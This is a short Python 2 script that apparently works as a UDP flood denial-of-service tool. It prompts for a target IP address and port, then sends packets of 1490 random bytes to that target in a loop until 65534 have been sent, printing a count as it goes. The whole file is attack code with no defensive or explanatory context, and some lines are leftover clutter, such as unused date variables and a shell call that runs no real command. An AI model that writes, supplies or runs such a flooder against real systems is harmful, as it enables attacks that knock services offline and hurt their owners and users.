import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############



ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("Attack Starting")
print "[Game Start!]"

time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)

     if sent == 65534:
          sys.exit()